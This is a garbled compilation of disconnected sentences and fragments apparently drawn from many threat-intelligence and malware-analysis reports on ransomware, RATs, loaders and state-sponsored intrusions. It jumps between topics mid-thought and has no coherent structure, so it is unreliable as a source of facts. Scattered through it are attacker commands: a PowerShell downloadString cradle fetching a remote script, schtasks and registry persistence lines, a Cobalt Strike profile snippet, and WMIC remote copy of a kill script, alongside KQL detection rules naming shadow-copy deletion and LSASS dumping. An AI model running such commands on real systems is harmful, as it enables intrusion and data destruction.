In order to avoid this mitigation technique, more threat actors have started abusing ISO file types.
Table of Contents Black Basta Overview Black Basta is ransomware as a service (RaaS) that leverages double extortion as part of its attacks.
From a static malware analysis review, very little was initially able to be obtained from the sample aside from the ".basta" suffix and a relation to "Fax." Static analysis conducted inside of x32dbg, showing a relation to "FAX" and the potential use of the directory "ProgramData": Upon detonation, running the malware sets itself up as the service "Fax" and enables it to start during safe boot.
###Global Options### set sample_name "whatever.profile"; set sleeptime "0"; <================ # Decimal number to indicate the time the beacon will sleep for between communications in milliseconds set jitter "25"; <================ # A number that indicates the percentage of a random sleep time that beacon will introduce to its C2 comm set useragent "<string>"; <================ # Custom user agent of your choice set data_jitter "35"; <================ # Represents the value bytes variable that would instruct Cobalt Strike to send a random string on http-get/post to match the bytes value. 
= 4 → SeTcbPrivilege.
This is based on the following factors: Malware (the intrusion set): The IconicLoader (samcli.dll) uses the same type of strong encryption – AES-GCM – as SimplexTea (whose attribution to Lazarus was established via the similarity with BALLCALL for Linux); only the keys and initialization vectors differ. 
Compromised accounts and networks are highly sought after by threat actors and will remain in high demand because they can be used in a number of attack vectors, including but not limited to account takeovers, identity theft, social engineering, credential stuffing, and brute forcing.
Lack of server egress control.
Using the user-agent, we detected that the attacker uses Antsword, an active Chinese-based opensource cross-platform website administration tool that supports webshell management. 
IsaacWiper A day after the initial destructive attack with HermeticWiper, on February 24th, 2022, a new wiper was used against the Ukrainian government, as reported by ESET, without any significant similarities to the HermaticWiper used the day before. 
We can check the entropy of the file sections, and if one of them has a value of 7 or higher, there is a high probability that the file is packed. 
Conclusion In this post we have discussed two important ways we’ve been able to tailor our analysis environment.
T1033
Proxy Routes traffic over TOR and VPN servers to obfuscate their activities. 
Centralizes and streamlines access to cybersecurity data to drive analytics for identifying and managing cybersecurity risks. 
[D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl @ 78] 03 00000000`0014fef0 00007ffb`ec0a7034 coop!__scrt_common_main_seh+0x10c
ServicePoint.
Linux and Mac File and Directory Permissions Modification Uses the chmod +x command to grant executable permissions to the ransomware. T1112.
Running a simple whois command over the main scriptsplatform domain shows that it was created/registered one day after the vulnerability was disclosed, suggesting that it was purpose-built for this mass infection:Domain name: scriptsplatform[.]com Registry Domain ID: 2780171223_DOMAIN_COM-VRSN Registrar WHOIS Server: whois.eranet.com Registrar URL: http://www.eranet.com Updated Date: 2023-05-12T00:00:00Z Creation Date: 2023-05-12T05:33:59ZVisitors to the infected websites are met with a bogus redirect served by shady ad networks pushing mainly adult dating and notification scams that can look a little something like this:Malware analysisAs you might have noticed, the malicious code added to the posts-layouts/posts-layouts.php actually tries to load three files: dist/init.php, dist/cache.php and dist/job.php.
If this method fails, the malware uses the DNS server operated by Google at IP address 8.8.8.8. 
/e /h
Conclusion At this moment we believe based on the evidence observed that the various intrusions were performed by the same group.
VirusTotal detection: older version of GoBruteforcer.Conclusion Web servers have always been a lucrative target for threat actors.
Now to the malware sample, 8adc8be4b7fa2f536f4479fa770bf4024b26b6838f5e798c702e4a7a9c1a48c6, which contains the new WatchDog Monero wallet, as shown in Figure 10.
A search of Active Directory for users whose passwords never expire, and the last set date while writing to a file for later exfiltration: Stopping Cisco AMP / Disabling Microsoft Defender, these are the same commands as observed in the ".bat" files: Transfer and use of Ticket-5731.xls
Ngrok is known to be used for malicious purposes.[1] The threat actors then executed Mimikatz on VDI-KMS to harvest credentials and created a rogue domain administrator account
The ransomware uses this technique to run the following operations: 
Allocate space within the process and write the payload data to the process memory.
The first compressed blob contains the RSA public key with the hash 0xe1285e64 (Figure 28). 
Most of the domain names we have seen were registered with Duck DNS, but they have also used DNS Exit for publicvm.com and linkpc.net subdomains. 
We found the C2 address by researching VirusTotal.
GHOST A careful inspection of the infrastructure shows multiple connections between the servers.
During a period of a few seconds, multiple NetrServerReqChallenge and NetrServerAuthenticate2 methods in the traffic from a single source were observed, this is one of the indicators of a Zerologon attempt. 
"C:\Windows\System32\schtasks.exe" /create /sc MINUTE /mo 15 /TN \Windows\DWM\DWMCORE /TR "cmd /c start /min
This suggests that the threat actor's origins may be in a Russian-speaking country since they most likely forgot to translate the HTML object from their native language into English Figure 3: Lost in translation? 
Spreading Adware As demonstrated earlier, the main page asks for permission to show notifications in the browser.
In some cases, we observed using the following command: start cmd.exe /k runonce.exe /AlternateShellStartup T1197.
Service: Copies itself to /etc/sshf and writes a service configuration at /lib/system/system/sshf.service, then enables the service (to make sure it starts at boot) with two commands: systemctl enable sshf service enable sshf All persistence mechanisms on older Linux versions use my.bin and my.bin.desktop instead of sshf and sshf.desktop. 
By using historic bitcoin to USD exchange rates, we estimate a total of 25 million USD was extorted with these NetWalker related transactions. 
Figure 4.
Cobalt Strike DNS Beaconing is a rule created by Florian Roth which looks at DNS logs to detect the default DNS C2 behavior based on the dns_stager_subhost, put_output and dns_stager_subhost as seen above. 
We only found one value 0x00000001 GUID 38 Follows the Microsoft format {89D0E853-FA08-4f94-A5FE-A90E6869E074} Size of the C&C section 4 0x00000018 Size of the next C&C domain name and port 4 0x00000014 C&C type 1 0x01 = regular C&C 0x05
Contents of script 34fDFkfSD32.jsBut here is where the similarity with the sample described in our Higaisa report ends: instead, this script copies the payload to the folder C:\Users\Public\Downloads, achieves persistence by adding itself to the startup folder and adding a scheduler task, and runs the payload.
The group's victimology is extensive, targeting organizations across various sectors globally.
This threat actor abused access to accounts in the Cloud Solution Partner’s environment with legitimate delegated administrative privileges to then gain access to several customers’ O365 environments. 
During that time, we observed port scanning activity from one of the domain controllers, to identify open ports such as SSH, SMB, MSSQL, RDP and WinRM.
With the config decrypted, the malware creates the cookies that contain the host information and sends an HTTP request that will contain the encrypted bot response. 
As for why the password-protected archive has the execution parent, upon checking the sandbox execution behaviors of Letter Head.docx on VirusTotal, we discovered that the VirusTotal sandbox will select any link embedded in the document.
Figure 2 – Spam email containing malicious doc attachment 
In addition could be interesting to note that, according to the visibility we can dispose of, limited telemetry hits related to the collected artifacts have been catched on 25/08/2022 and 09/09/2022 from two countries of the European Union (we have no data available before 25/08/2022). 
The Lite Loader’s purpose is to download the next stage of the malware from a hardcoded domain and URI path.
SimplexTea executes new processes with the same technique. 
T1518Software DiscoveryFlowCloud uses the IShellAppManager COM object to list installed software. 
Instruction in the file readme.txt" the only files still accessible to the user are the "readme" files. 
Microsoft Threat Intelligence has detected destructive operations enabled by MERCURY, a nation-state actor linked to the Iranian government, that attacked both on-premises and cloud environments.
CSC 5 Secure Configuration CSC 8 Malware Defenses Endpoint Security Platform 10.7 Threat Prevention Persistence Modify Registry key – Create own key (T1112) 
, "System.IO.Compression", "System.
Next, the malware creates 2 scheduled tasks called test and test2 to retrieve and execute PowerShell commands, each retrieved from robots.txt from different C&C servers, most likely to eliminate a single point of failure: schtasks /Create
Figure 20.
However, they are different in terms of their function and order of appearance.
The original logging file (top), with plain text revealed in the decrypted logging file (bottom) Taking one of the execution results as an example, much of the information of the exfiltrated data is saved, including the original file path, the original file size, and the compressed file size.
ParentImage|endswith: - 'java.exe' condition: selection and not filter falsepositives: - Possible from admin activity level: high tags: - attack.discovery #TA0007 - attack.
title: Threat Actors Use MSBuild to Deliver RATs Filelessly url: https://www.anomali.com/blog/threat-actors-use-msbuild-to-deliver-rats-filelessly Authored by: Tara Gould and Gage Mele Key Findings Anomali Threat Research identified a campaign in which threat actors used Microsoft Build Engine (MSBuild) to filelessly deliver Remcos remote access tool (RAT) and password-stealing malware commonly known as RedLine Stealer This campaign, which has low or zero detections on antivirus tools, appears to have begun in April 2021 and was still ongoing as of May 11, 2021. 
We’ve seen this malware remotely deploy a variety of different types of malware as payloads, including coinminers.
XWorm is a commodity RAT (Remote Access Trojan) reportedly sold in underground forums for $30 to $150.
This sample was extracted from MD5: c25e8e4a2d5314ea55afd09845b3e886, which was submitted to a public malware repository in December 2017. 
The main module then decrypts the payload, verifies its checksum and executes the C&C command.
Next, it will launch “notepad.exe” with an argument to the ransom note file to show the user what happened on the system: Figure 16.
ConclusionThe DNS service is a critical component of internet infrastructure.
Crimson RAT variants implement different obfuscation techniques of varying intensities, for example, simple function name malformation and dynamic string resolution.
We have observed several threat actors, such as zirochka, on top-tier Russian-language forums XSS and Exploit auctioning compromised network accesses targeting entities in LATAM in bulk for relatively low prices (< $100).Figure 1: Timeline of ransomware attacks on LATAM government entities, mapped to references to LATAM on dark web and special-access sources (Source: Recorded Future)We have observed a slight increase in database dumps related to LATAM government entities, beginning in March 2022 and spiking on April 4, 2022.
All non-approved remote access solutions should be blocked by default by an application control capability.
Before diving deeper into the functionalities, we want to highlight some notable characteristics: Configuration information and data for communications with the C&C server are Protobuf-serialized, compressed, and encrypted. 
Implement time-based access for accounts set at the admin level and higher.
This service can be used to generate a digital certificate that includes information about a lead, such as geolocation, IP address, browser type, operating system, the time spent on the page, and even a web session replay.
A machine translation of Interview questions.txt The other file Interview conditions.word.exe (SHA256: 03b9d7296b01e8f3fb3d12c4d80fe8a1bb0ab2fd76f33c5ce11b40729b75fb23) contains the first stage Enigma loader.
[T1569 – System Services] Service Name: TcwvBcuf Action: %COMSPEC% /Q /c
This requires either social engineering tactics to get the target to execute the malware or another program/script to execute the file.
TickCount variable.
AutoFocus customers can track the activity with the tag “IronNetInjector”. 
In this case the key is {03 9B 54 72 17 D3 5E E6 E0 E9 EF E0 DF 36 0D 79}. 
Implement controlled folder access and add folders to the protected folders list to help prevent files from being altered or encrypted by ransomware.
The PoS version of Prilex is coded in Visual Basic, but the stealer module, described in this article, is in p-code.
Also, the rule was triggered on PID 3784, which belonged to RUNDLL32.exe. 
UAE iceland a78c53351e23d3f84267e67bbca6cf07 206.189.123.156 Israel (IT) idapro a78c53351e23d3f84267e67bbca6cf07 206.189.123.156 Israel (IT) galway 04c51909fc65304d907b7cb6c92572cd 
Example 1—Loading REvil ransomware 
Past performance is not indicative of future results.
Since this structure is not part of the public API and can change between releases, the rootkit contains code to match the operating system’s build number to the correct offsets in this structure.
Figure 14.
After the strings are decrypted, the structure referencing them is never used again.
Figure 7 Section 3 of GuLoader's first stage PowerShell. 
SamplePacketContent) |where SignatureName
After dropping the files, the Installer sets up persistence.
The Cobalt Strike beacons then began to execute successfully on the domain controller.
Among other activities, the image mapping process includes allocating memory for the image, storing the image headers and sections in the memory, populating the images’ import and delay import tables, adding exception handlers, and executing TLS callback and export routines.
No The batch file written to disk by Sandals is named <GUID>.bat, where the filename is the output of the Guid.
In both cases, the affected organizations had files encrypted with the “.akira” extensions and had nearly identical ransom note files, named fn.txt, dropped in the process (as shown below in Figure 1]. Figure 1: “fn.txt” ransomware notice This Akira ransomware bears no code similarity to a previous ransomware strain with the same name that was active in 2017 and is likely unrelated.
This campaign also substantiates the regular usage of chat applications as infection vectors from Iron Tiger.
The latter downloads a payload that extracts and injects in itself a new PE (Portable Executable) file, that the analysis showed to be a variant of a malware family known as Graphite, that uses the Microsoft Graph API and OneDrive for C&C communications. 
[WINDOWS-CLIPBOARD] Powershell Policy Bypass Command 5008365 
It has an extensive past of code forks and evolutions that has lead to several active variants in the last 5 years including Dreambot, IAP, RM2, RM3 and most recently, LDR4. 
This could be because banking fraud has become increasingly more difficult over the last couple of years. 
Although no sample was able to be provided for the Client.exe (which is believed to be the ESXi variant), Quadrant was able to obtain a copy of "Client_s.exe" for Windows hosts. 
If the goal of this operation is extortion, we anticipate that victim organizations could receive extortion emails in the coming days to weeks.
Multifactor authentication (MFA) prompts prevented the team from achieving access to one SBS, and the team was unable to complete its viable plan to compromise a second SBSs within the assessment period. 
The Installer When the victim executes the malicious app, an executable located at the <malicious application name>.app/Contents/MacOS/installer path is launched.
powershell new-itemproperty -path hklm:\system\currentcontrolset\control\lsa -name disablerestrictedadmin -value 0
Learn more about the Cyber Threat Alliance. 
Unix Use application controls to prevent execution. 
Lizar was reportedly first used in March 2020, when it was originally named Tirion, and has been observed in numerous ITG14 campaigns up to the end of 2022.
Figure 31.
The ProcessWorm can be injected to processes in two ways – either by spawning a remote thread with the shellcode or by creating an APC (Asynchronous Procedure Call) with the procedure address pointing to the start of the shellcode.
If Windows Defender or Bitdefender Antivirus is installed on the victim’s computer, the malware executes itself with the following commands: Windows Defender: cmd /c
Finally, we will list the various applications from which the malware steals data. 
In order to establish persistent access to Linux ESXi devices, the threat actor enables SSH after authenticating to vCenter.
Unlike their initial exploitation of vulnerable internet-facing applications, which is largely indiscriminate and affects organizations across sectors and geographies, activity associated with this campaign was highly targeted and affected fewer than 10 organizations.. 
In comparison, we see less flexibility in FY 2022 Q1 and Q3 – threat actors only offered an average of about 30% as a price drop.
Ransom Note Trigona’s ransom note is dropped to the system with the name how_to_decrypt.hta.
Hence, the analysis showed that the sample in question is a version of the Graphite malware, a malware using the Microsoft Graph API and OneDrive for C&C communications.
Multiple new versions and variations of GlobeImposter have appeared in the years since.
Trough Reverse Proxy The threat actor utilized open-source reverse proxy tools to expose local devices located behind a NAT or firewall, to the Internet.
All the collected information is then put together into a query string which is generated based on the computer architecture. 
To the best of our knowledge, the activity described in this report can be attributed to a group widely known as APT41, or an actor closely affiliated to it, with medium to high confidence.
The README file contains a list of URLs that direct targets to the C2 infrastructure associated with Drokbk. 
[D3-JFAPA] Tactics: Lateral Movement
Here are some best practices to protect your systems against threats that leverage the gaps in your NAS devices: Avoid connecting a NAS device directly to the internet. 
SHA-256 Detection Description c0063d24f3de4e7b89abf9b690a3d264efc6ab7a626f73ad9f42d6bffe52bce7 Trojan.
The type of commands that can be executed range from manipulating of registry keys, to creating processes, and deleting files, etc., effectively providing the attackers with full access to the device, especially since it’s executing from a trusted, signed binary. 
What can you do to defend against them?
In Figures 9 and 10, we can see the communication to the public file storage service. 
[DS0002]. Create Account:
a=http&dev=1&v={$config["version"]}&machine_id={$macID}&from={$config['b']}&tag={$tag}&uname={$uname}&mt={$time}&f=" .
Use modern browsers with security features turned on. 
The red team queried parsed Bloodhound data for members of the SharePoint admin group and identified several standard user accounts with administrative access.
Other samples leverage the function Delegate.
Interestingly, a new member of the cybercrime forum RAMP under the name “Mallx” was observed recruiting affiliates for the Mallox ransomware-as-a-service (RaaS) affiliate program. 
The largest connection between P0 and the C2 domain.
Always take care when handling attachments, and never open CHM files as they are antiquated and not commonly used for legitimate purposes currently. 
The payload was found to be a hitherto unknown backdoor, which will be referred to as Domino Backdoor. 
The received shellcodes are protected with either FinSpy Mutator, an obfuscator resembling OLLVM or both these protectors.
Unknown galway 09ffc31a432f646ebcec59d32f286317 
These observations are recorded anecdotally via Insikt Groups daily threat leads, analyst notes, and reports.
copy \sourceip\c$\windows\temp C:\WINDOWS\TEMP\kill.bat" WMIC /node: \destinationip /username:”domain\username”
The employment termination malspam was observed on October 6, 2020 and the anonymous survey malspam was observed on October 8, 2020.
The Cofense:registered: and PhishMe:registered: names and logos, as well as any other Cofense product or service names or logos displayed on this blog are registered trademarks or trademarks of Cofense Inc. 
[T1615].
The .ps1 file can also be a complex script that can also achieve persistence with more functionalities. 
However, when viewed using a hex editor, the text content of the shortcut is rendered visible.
The webinjects module hooks the API calls responsible for sending, receiving or encrypting data sent to a web server.
In Figure 1, we can see a screenshot of the ATMSpitter malware family, which requires the DLL MSXFS.dll to fully detonate.
Still the fact that a large ransomware gang has apparently set its sights on macOS, should give us pause for concern and also talk about preventing this (and future) samples in the first place. 
According to its website, 3CX has more than 600,000 customers and 12,000,000 users in various sectors including aerospace, healthcare, and hospitality.
Mail.
Figure 12: Calling Stage 2 Shellcode BazarLoader’s stage 2 shellcode will make use of encrypted stack strings for many purposes throughout the rest of its code. 
Figure 14 shows, after the extraneous code has been removed, how that interface is used. 
T1566.001
Conclusion Sophos MDR is sharing this information with the specific goal of aiding defenders in the seemingly never-ending battle with ransomware threat groups.
When the manifest is created, a dword value is written based on the current timestamp, with additional arithmetic operations performed on it. 
A threat actor could take advantage of this vulnerability by creating a specific file that contains data that is stored in the JET database format, and having the targeted user open it, which would then allow for remote code execution at the level of the current process.
Extracting credentials Two weeks before the ransomware deployment, the threat actors were observed using compromised credentials to access the Azure AD Connect device.
Uninstall the backdoor.
In this report, we analyze another previously undisclosed backdoor associated with this cluster of activity which shares with it not only a common infrastructure but also the same high-level intelligence-gathering goal. 
Countries affected include Costa Rica, Peru, Mexico, Ecuador, Brazil, and Argentina, among others, all of which have publicly condemned Russia for invading Ukraine at the United Nations General Assembly (UNGA).
Various samples with the name human2.aspx were uploaded to VirusTotal beginning on May 28, 2023.
Building .text Section for Stage 2 Once the PE has been extracted to memory, it will make a direct call instead of using Threading APIs (same trickery as before).
Several functions can be a good place for putting a breakpoint and attempting to fetch the extraction process.
However, based on incident response observations, they are quick to leverage new vulnerabilities for lateral movement and persistence on a victim's network.
title: Chinese Threat Actor Used Modified Cobalt Strike Variant to Attack Taiwanese Critical Infrastructure url: https://blog.eclecticiq.com/chinese-threat-actor-used-modified-cobalt-strike-variant-to-attack-taiwanese-critical-infrastructure Executive Summary EclecticIQ researchers identified a malicious web server very likely operated by a Chinese threat actor used to target Taiwanese government entities, including critical infrastructure.
Note the importance of restricting 0 in the output range of the encoding function.
.pps .ppt .pptx .ps .psd .py .rar .rm 
Historically, npm has been the unfortunate leader and PyPI an also-ran in the race to see which open-source platform attracts the most attention from malware authors.
Chief among those changes are the embedding of a raw disk driver, providing direct hard disk access inside the malware itself, modified metadata, and the use of Nvidia’s leaked code signing certificate to sign the malware. 
We observed this beacon performing various techniques (Process injections in svchost process via CreateRemoteThread, Default named pipes, etc.) Command and Control The graph below shows all communications to malicious IP addresses made by the dropped payloads or processes which threat actors injected into: BumbleBee 142.91.3[.]109 45.140.146[.]30 All the active Bumblebee command and control shared a common server configuration in regards to TLS setup. 
We have low confidence that UNC215 is associated with APT27. 
The threat actor also engaged in brute-forcing against the victim's internal web services. 
ULHFlowCloud v4.1.3 hcClientLoaderZero_x86 backdoor. 
This, combined with the ability to configure many parts of the payload, makes hash-based detection almost impossible.
Files are deleted after use. 
Depending on which shortcut was opened, the output of ipconfig was sent to one of two addresses: http://goodhk.azurewebsites[.]net/inter.php or http://sixindent.epizy[.]com/inter.php. 
WebClient).downloadString('http://IP:PORT/malicious.ps1')" The .ps1 file could be a simple stager download of an .exe file and its execution.
[T1078]: Default Accounts [T1078.001] Domain Accounts [T1078.002] Chinese state-sponsored cyber actors have been observed: gaining credential access into victim networks by using legitimate, but compromised credentials to access OWA servers, corporate login portals, and victim networks. 
The threat actor(s) responsible for Black Basta operate a cybercrime marketplace and victim name-and-shame blog.
Shortly after, the malware authors responded with an updated version for which no decryption tools are available. 
Network traffic of data upload to the attacker's telegram channel Figure 42.
Upon execution, this command extracted, decrypted, and executed the PowerShell backdoor payload stored in the HiveUploadTask text property of the RacTask class.
The initial stage of Enigma, Interview conditions.word.exe, is a downloader written in C++.
You can read more about detecting “Pass-The-Hash” here by Stealthbits and here by Hausec. 
In multiple engagements, this led CrowdStrike incident responders to identify that the malicious authentications into victim O365 tenants had originated from within the victim’s own network. 
The G20, or Group of Twenty, is an international forum comprising 19 countries and the European Union (EU).
WinInet.dll userenv.dll psapi.dll netapi32.dll mpr.dll wtsapi32.dll api-ms-win-core-processthreads-l1-1-0.dll ntoskrnl.exe Rpcrt4.dll User32.dll api-ms-win-core-com-l1-1-0.dll Cabinet.dll shell32.dll OleAut32.dll Ole32.dll ntdll.dll mscoree.dll kernel32.dll advapi32.dll The library name and export function name hashed value is then passed to GetExportAddressByHash, which is responsible for opening the handle to the library, creating a hash for each export function name, and comparing it with the passed argument.
We’ve seen the adversary staging data on a remote system or on the local system.
[Ped91]: Pedersen, T.P. Non-Interactive and Information-Theoretic Secure Verifiable Secret Sharing. 1991.
After our dark web team discovered LummaC2, we found that it was being sold on underground forums.
From September to December this year, we have detected multiple attacks from Royal ransomware, with the US and Brazil being the most targeted countries (Figure 1).
Website owners with automatic plugin updates enabled are best protected against situations like these.
REG_SZ /d "" /f reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v
Account discovery (T1087) With access into the network of the victim, the adversary finds a way to install a Cobalt Strike beacon on a system of the victim (see Execution).
The virtual disk file contains a decoy PDF file, Windows executable file, and an encrypted Dump.bin file.
Collection [TA0009] Table XI: Chinese state-sponsored cyber actors’ Collection TTPs with detection and mitigation recommendations Threat Actor Technique / Sub-Techniques Threat Actor Procedure(s) Detection and Mitigation Recommendations Defensive Tactics and Techniques Archive Collected Data [T1560] Chinese state-sponsored cyber actors used compression and encryption of exfiltration files into RAR archives, and subsequently utilizing cloud storage services for storage. 
Figure 13 - RedLine .NET
Enable conditional access policies Conditional access policies are evaluated and enforced every time the user attempts to sign in.
Some further reading and research: tl;dr Combining the following minor issues might cause RCE on a client. 
Subject CCN Valid from2019-11-13 00:00:00 UTC Valid to2020-11-12 23:59:59 UTC Network DomainIPFirst seenDetails 43.254.216[.]1042020-06Delivery server 45.124.115[.]1032020-08Delivery server 161.82.181[.]42020-12Delivery server 43.254.219[.]1532020-07X4 C&C server 154.223.141[.]362020-06HTran C&C server 103.139.2[.]932020-10Tendyron C&C server cahe.microsofts[.]comQuasarRAT C&C server ffca.caibi379[.]comQuasarRAT downloader C&C server smtp.nsfwgo[.]comKorplug C&C server 45.124.115[.]1032020-06LookBack C&C server 185.225.19[.]172021-01LookBack C&C server 94.158.245[.]2492020-03LookBack C&C server 5.252.179[.]2272021-03LookBack C&C server 222.186.151[.]1412019-11FlowCloud C&C server 47.111.22[.]652020-09FlowCross C&C server 114.55.109[.]1992020-05FlowCloud C&C server dlaxpcmghd[.]com185.225.17[.]392020-09LookBack C&C server wwww.dlmum[.]comN/AFlowCloud C&C server MITRE ATT&CK techniques This table was built using version 9 of the MITRE ATT&CK framework. 
Data Coowon\Coowon\User Data liebao\User Data QIP Surf\User
However, we also found malicious NSIS installers used by other unrelated groups that had the same benign files as the ones used by this group.
Additional protections with context to your specific environment and threat data are available from the Firewall Management Center.
IO.MemoryStream", "iex ", "iex(", "Invoke-WebRequest", "set-MpPreference", "add-MpPreference", "certutil", "bitsadmin") // "csvhost.exe", "ekern.exe", "svhost.exe", ".dmp" or ProcessCommandLine matches regex @"[-/–][Ee^]{1,2}[ncodema^]*\s[A-Za-z0-9+/=]{15,}")) or (FileName =~ "curl.exe" and ProcessCommandLine contains "http") or (FileName =~ "wget.exe" and ProcessCommandLine contains "http") or ProcessCommandLine has_any ("E:jscript", "e:vbscript") or ProcessCommandLine has_all ("localgroup Administrators", "/add") or ProcessCommandLine has_all ("reg add", "DisableAntiSpyware", @"\Microsoft\Windows Defender") or ProcessCommandLine has_all ("reg add", "DisableRestrictedAdmin", @"CurrentControlSet\Control\Lsa") or ProcessCommandLine has_all ("wmic", "process call create") or ProcessCommandLine has_all ("net", "user ", "/add") or ProcessCommandLine has_all ("net1", "user ", "/add") or ProcessCommandLine has_all ("vssadmin", "delete", "shadows") or ProcessCommandLine has_all ("wmic", "delete", "shadowcopy") or ProcessCommandLine has_all ("wbadmin", "delete", "catalog") or (ProcessCommandLine has "lsass" and ProcessCommandLine has_any ("procdump", "tasklist", "findstr")) | where ProcessCommandLine !contains "download.microsoft.com" and ProcessCommandLine !contains "manageengine.com" and ProcessCommandLine !contains "msiexec" Ruby AsperaFaspex Suspicious Process Execution. DeviceProcessEvents | where InitiatingProcessFileName hasprefix "ruby" | where InitiatingProcessFolderPath has @"aspera" | where (FileName in~ ("powershell.exe", "powershell_ise.exe") and (ProcessCommandLine has_any ("whoami", "net user", "net group", "localgroup administrators", "dsquery", "samaccountname=", " echo ", "query session", "adscredentials", "o365accountconfiguration", "-dumpmode", "-ssh", "usoprivate", "usoshared", "Invoke-Expression", "DownloadString", "DownloadFile", "FromBase64String"
Defense EvasionT1140Deobfuscate/Decode Files or InformationThe attackers have used various encryption algorithms in their droppers to hide strings and payloads. 
How Zerobot spreads After persistence is achieved, Zerobot scans for other internet-exposed devices to infect.
Thus no particular symptoms are clearly visible on an infected machine. 
Upon successful authentication, a user will be able to access the respective services. 
Proofpoint predicts that most threat actors will continue to use the “Standard” variant, but the deployment of new IcedID versions will likely grow, and more variants may pop up later in 2023. 
In this example, we will inspect a packed sample of Locky ransomware.
Our colleagues in AhnLab published a more thorough behavioral analysis of another Rorschach variant which provides further details into the operations. 
Cobalt Strike Execution The Emotet DLL is then used to download Cobalt Strike, which is then injected into svchost and dllhost. 
DiscoveryThe attackers have used various RATs that gather system information such as computer name and operating system during the initial infection. T1016System Network Configuration DiscoveryThe attackers have used various RATs that can collect the IP address of the victim machine. 
Patch and Vulnerability Management Install vendor-provided and verified patches on all systems for critical vulnerabilities, prioritizing timely patching of internet-connected servers and software processing internet data—such as web browsers, browser plugins, and document readers. 
EF0BB8490AC43BF8CF7BBA86B137B0D29BEE61FAdr.dllWin32/Agent.
Sending back the result of the command’s execution to the C2 server. 
Bypass User Account Control
The differentiation between the variants starts in the next part, which is another JavaScript fetched from the C2 server. 
The post Analyzing Solorigate, the compromised DLL file that started a sophisticated cyberattack, and how Microsoft Defender helps protect customers appeared first on Microsoft Security. 
Figure 11 – URL and build decryption function. 
Earth Pretas Cyberespionage Campaign Hits Over 200
Figure 2 In the following section, we explore a recent RedLine Loader used, the defense evasion technique and RedLine Stealer capabilities. 
“The content displayed on the victim’s browser lures them to click an embedded malicious hyperlink which downloads a RAR file.
One does not use any obfuscation and just contains the simple command to stop Cisco AMP Orbital.
Active Directory queries for remote systems have been performed by ADFind. 
This includes the hostname, operating system name, OS version, username, Internet information, as well as the presence of any installed anti-virus software on the machine. 
Non-Standard Port [T1571] Chinese state-sponsored cyber actors have been observed using a non-standard SSH port to establish covert communication channels with VPS infrastructure. 
Payload length is customizable.
South African victims are from a single organization in the diamond industry, with the Hong Kong victim being a jeweler. 
In both samples, the "db" file is not a database, but is the actual Qakbot trojan. 
LockBit’s continuation with operations and its next iteration coming up on the horizon means that organizations and their security teams need to stay vigilant in the ever-evolving threat landscape. 
Step five is where things get interesting.
Figure 6: Intermediate PowerShell downloader.
Figure 1: Files containing package functionality Unmasking an unusual loader Threat actors are always trying to evade detection from security solutions.
Windows Command Shell Execution T1047 Windows Management Instrumentation Persistence T1505.003 Server Software Component: Web Shell Defense Evasion T1070.004 Indicator Removal on Host: File Deletion Defense Evasion T1036.005 Masquerading: Match Legitimate Name or Location Defense Evasion T1620 Reflective Code Loading Credential Access T1003.001 OS Credential Dumping:
However, we did infect a test machine with other samples from this attack, and some of those were successful at connecting to C2 servers at 84.21.172.49:1040 (ironic port number!)
The tool was used by the adversary on various systems to write events from the Windows Security Event Log to a text file.
In addition to running the I2P network stack, it also contains static configuration elements necessary for the operation of the XMRig miner.
The banking trojan can collect the victim’s login credentials for various online accounts, operating system information and keystrokes.
This is potentially due to domain passwords being required to be changed every 60 days. 
Read Service Principal Abuse Finally, the threat actor utilized the compromised Service Principal with the assigned mail.read permissions to then read emails of several different users in the company’s environment. 
This campaign mysteriously disappeared in mid-April 2022, resurfacing in Oct 2022 with the addition of the self-propagation feature. 
The attacker used the Internet Explorer icon for the dropped shortcut files.
Ingress Tool Transfer;After gaining initial access, the attackers copy tools necessary for deployment to the compromised host. ;
pc.exe file chunksWe noticed that the attackers ceased their activities after stealing credentials.
There are several ways to use Windows Group Policy to avoid these kinds of post exploitation attempts: • 
LookingFrog uses a first-stage backdoor called X4, and LookBack as a second stage. 
The call to kernel32.CreateMutexA can be seen in Figure 13. Figure 13: Mutex Creation Interestingly, BazarLoader will check for mutexes twice. 
Process injection Multiple suspicious calls to the function CreateRemoteThread (Sysmon Event ID 8) were observed.
What we do care about is that if we learn about these techniques during an investigation, can we map them out and support our IR team on the ground, or a customer’s IR team, with the knowledge that can help determine which phase of the attack the evidence is pointing to and based on historical data and intelligence, assist in blocking the next phase and discover more evidence? 
fish 760? pier%complaint
Tunneling This DNS attack routes unsuspecting user traffic to the attacker’s server.
By default, all three modes (local, mount and discovery)are enabled, so all local, mounted and shares able to be enumerated will have their contents encrypted.
This presumably encrypted the local drive and also all network shares the user had access to:"C:\Windows\int.exe" -u <REDACTED>:<REDACTED>"The malicious actor also manually executed the 64 bit version of the ransomware (int64.exe) once on a different host with the -no-discovery flag.
Initial access Threat Intelligence shows that LAPSUS$ utilise multiple methods to gain Initial access. 
persistent loader – unpacks and loads the next stage of the malware, namely the main module. 
Using the remote admin tools, they used Rclone to exfiltrate important data from a file server and upload it to MEGA.
Encoding]::UTF8.GetBytes($postParams); $req =
i in (servers.txt) do for /f "tokens=2 delims=[]"
The attack starts when the victim receives an email or a text message that uses a common social engineering technique, creating a false sense of urgency to get the victim’s attention. 
The infection starts with an income tax-themed phishing email written in Spanish, disguising itself as a tax receipt notification and enticing users to open the attached malicious HTML file.
Also finds out that GuLoader’s VEH has been called more than 1100 times. 
In 2021, North Korean threat actors compromised several email accounts of prominent defectors to send malicious documents to contacts working on DPRK issues.
The location also did not matter.
